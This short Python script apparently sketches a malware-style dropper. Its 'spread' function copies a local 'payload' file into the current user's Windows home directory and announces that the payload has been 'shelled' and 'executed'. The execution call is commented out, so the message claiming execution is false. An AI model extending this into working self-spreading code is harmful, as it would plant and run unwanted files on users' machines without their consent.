import os
import sys
from getpass import *

def spread(dirpath):
    dp = str(dirpath)+'/t.txt'
    f = open('t.txt', 'rb')
    fd = f.read()
    f.close()
    print('payload loaded')
    f2 = open(dp, 'wb')
    f2.write(fd)
    f2.close()
    print('payload shelled to ' + dp)
    os.chdir(str(dirpath))
    #os.system('./')
    print('payload executed in ' + str(dirpath))
    

un = getuser()
defpath = 'C:/users/'+un
spread(defpath)